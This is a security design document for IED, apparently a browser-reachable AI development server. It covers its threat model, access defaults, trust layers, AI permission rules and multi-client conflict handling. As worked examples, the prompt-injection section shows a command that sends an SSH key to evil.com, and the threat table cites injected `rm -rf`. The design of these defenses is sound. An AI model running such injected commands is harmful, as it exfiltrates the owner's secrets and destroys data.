# 11 - Security, remote access and multi-client rules

## Purpose

Resolve `docs/99` #13. IED's server can read and write files, run shells, start processes and spend cloud-model money. It is also reachable from a browser - the most hostile client environment there is - and, by design, from other devices. This doc fixes the threat model, the access defaults, how trust and permissions layer, and what happens when two devices act at once.

## Threat model (what we defend against)

| Threat | Example | Defense |
|---|---|---|
| Malicious web page in the owner's browser attacks the localhost server | DNS rebinding to `127.0.0.1:port`; cross-site WebSocket hijacking; CSRF on HTTP endpoints | Host allowlist, Origin check, SameSite=Strict cookies, launch token (below) |
| Other device on the LAN | Someone on the same Wi-Fi opens the IED URL | Loopback-only by default; LAN bind requires an owner password; rate-limited login |
| Malicious repository | A cloned repo ships a project-local plugin, a toolbar command, an MCP server, or an LSP binary that runs code | Workspace trust (nothing project-defined executes until trusted) |
| Prompt injection | A fetched web page or file tells the AI to exfiltrate secrets or run `rm -rf` | Permission modes + approval cards, egress policy, secrets never in model context, privacy taint, tool path restrictions |
| Malicious or buggy plugin | A plugin reads files it should not | Declared permissions enforced at the host API; approval on install; safe mode |
| Credential leakage | API keys in committed JSON or logs | OS credential store, redaction everywhere |

Out of scope for v1: a compromised OS user account (anything running as the owner can read the owner's files anyway), and multi-user servers (IED is single-owner).

## Access defaults

1. **Bind `127.0.0.1` only** by default. LAN bind (`0.0.0.0` or a chosen interface) is an explicit setting, and it is refused until an owner password exists.
2. **Every HTTP request and WS upgrade checks the `Host` header** against an allowlist (`localhost`, `127.0.0.1`, `[::1]`, plus configured LAN names/IPs). This defeats DNS rebinding.
3. **Every WS upgrade and state-changing HTTP request checks `Origin`** equals the server's own origin(s). Cross-site WebSocket hijacking fails.
4. **Loopback still authenticates.** The CLI/tray opens `http://127.0.0.1:<port>/?t=<one-time-token>`; the server exchanges the token for a session cookie (HttpOnly, SameSite=Strict, Path=/). Without a cookie or token, loopback clients get the login page. The token is single-use, 60 s lifetime, delivered only through the user-ACL'd named pipe or the tray. This means a random local web page cannot drive the server even via loopback.
5. **Remote clients** log in with the owner password (Argon2id hash, 12+ chars, rate limit 5/min/IP with exponential lockout). Sessions are per device, 30 days sliding, listed and revocable (F-SRV-33).
6. **TLS:** v1 recommends a private overlay (Tailscale/WireGuard) for anything beyond the LAN; Tailscale's HTTPS certificates give real TLS without IED managing certs. Built-in self-signed TLS with a per-install CA is P2. Cookies get `Secure` whenever the request arrived over TLS.
7. **CSP** on the app: `default-src 'self'`; scripts only from the server; `connect-src 'self'`; frames only from the port-forward prefix and `blob:`. Plugin UI modules are served from the same origin (they are trusted code once enabled - see below).

## Trust layers

Three independent switches, each with a narrow meaning:

| Layer | Scope | Controls | Default |
|---|---|---|---|
| **Workspace trust** | a folder/solution path | whether *project-defined executables* run: local plugins, toolbar/task commands from project files, project MCP servers, project LSP/DAP binaries, sandbox setup scripts, AI tools that execute code | untrusted until the owner trusts it |
| **Plugin approval** | an installed plugin (by content hash) | whether a global plugin's code may load at all, and with which permissions | built-ins approved; others need approval |
| **AI permission mode** | a chat (with rules at app/solution tier) | which tool calls run without asking | `ask` for mutations, auto for reads |

Workspace trust is recorded in app tier (never in the repo - a repo cannot trust itself). Trust is re-requested when the solution's local-plugin pins, task commands or MCP definitions change (diff shown).

## AI permission model

**Permission modes** (per chat, default from mode/solution):

| Mode | Reads | Edits in workspace | Shell / processes / network grants / outside-workspace writes |
|---|---|---|---|
| `plan` | auto | denied | denied (read-only commands from an allowlist may run) |
| `ask` (default) | auto | ask | ask |
| `acceptEdits` | auto | auto (checkpointed) | ask |
| `auto` | auto | auto | auto within rules; ask for anything matching a `confirm` rule |

**Rules** (app tier and solution tier; solution rules can only *restrict*, never widen beyond app rules unless the workspace is trusted):

```jsonc
"ai.permissions": {
	"allow":   ["shell(nuke.bat build *)", "shell(git status*)", "fs.write(src/**)"],
	"confirm": ["shell(git push*)", "shell(* --force*)", "fs.write(.ied/**)"],
	"deny":    ["fs.read(**/.env)", "fs.*(secrets/**)", "shell(format *)"]
}
```

Evaluation order: deny -> confirm -> mode -> allow. The approval card's "Always allow" writes an `allow` rule at the tier the owner picks.

**Invariants (regardless of mode):**

- The AI never receives secret values. Settings reference secrets by name; tools that need them (e.g. an HTTP tool with an auth header) get the value injected server-side, and results are redacted.
- Tool path checks are done on **resolved real paths** (symlinks and `..` resolved), against the workspace roots plus explicitly granted extra paths.
- Deletes go to the recoverable trash.
- Every executed command and file change is attributable in the trajectory and the per-turn checkpoint.
- An untrusted workspace has no execute-class tools at all (not even with approval) - trust first.

## Prompt-injection posture

Not solvable in general; IED limits the blast radius:

- Fetched web content and MCP results are marked as *untrusted content* in the transcript (the base prompt tells the model to treat embedded instructions as data).
- Egress policy limits where data can go; private chats cannot reach cloud models at all.
- The approval layer is the backstop: a prompt-injected `curl evil.com -d @~/.ssh/id_rsa` is an `ask` in default mode and would read outside the workspace (path rule).

## Plugin permissions

Declared in the manifest (`docs/02`), shown before enabling, enforced at the host API boundary for JS and process plugins. Built-in plugins are trusted code but still declare permissions (documentation + future isolation). **UI modules run in the page with full client privileges** (they can send any WS request the user can) - so a UI module is exactly as trusted as its plugin. Third-party UI that should not be fully trusted must use the sandboxed-iframe view type (`view.kind: "iframe"`), which talks through a narrow postMessage bridge (Echo's model). v1 ships both; built-ins use in-page modules.

## Secrets

- Stored in Windows Credential Manager (DPAPI), under `IED/<name>`; settings hold references (`{"secret": "anthropic-key"}`) or env references (`{"env": "ANTHROPIC_API_KEY"}`).
- Never sent to clients (settings UI shows `******` + "replace"), never written to logs, trajectories, tool results or diagnostics bundles (a redaction filter over every outbound text sink matches known secret values).

## Multi-client concurrency rules

All clients see the same server state. Conflicts are resolved by explicit, visible rules - never silent last-writer-wins.

| Resource | Rule |
|---|---|
| **Document text** | One edit lease per document (first editor gets it). Others see a live read-only mirror with *Take over*. Lease auto-releases after 2 min idle. AI/server edits are merged by the server (`docs/10`). |
| **Chat input** | Sends are serialized per chat. A second send while a turn runs becomes a queued message or an injection (explicit choice in the UI), never a rejected error. |
| **Approvals and questions** | First answer wins; other devices see the card resolve with "answered on <device>". |
| **Debug controls** | Revision-checked: a "step" based on stale state is rejected (`conflict`) and the client refreshes. Two devices pressing Continue results in one continue. |
| **Terminal input** | Input lease per terminal (whoever typed last within 30 s); others can view and take over. |
| **Task runs** | A button pressed on two devices joins the existing run if the task's concurrency policy is `queue`/`single` (both see the same run). |
| **Layout** | Per device class, so phone and desktop do not fight. Two desktops share the desktop layout; layout changes are cheap and last-writer-wins *is* acceptable here (non-destructive). |
| **Settings** | Revision-checked writes; the settings page shows "changed on another device - reload" on conflict. |
| **Git operations** | One mutating git operation per repository at a time (server-side lock); others queue with a visible "waiting for <op>". |
| **Sandbox desktop** | Input lease; taking control from another device asks for confirmation. |

**Presence:** the status bar shows connected devices; editors show "being edited on <device>" when another device holds a document lease.

## Audit

The server keeps an append-only security log (`%LOCALAPPDATA%/IED/logs/security.log`): logins, device sessions created/revoked, trust changes, plugin approvals, permission-rule changes, LAN bind changes. Viewable in Settings > Remote Access.
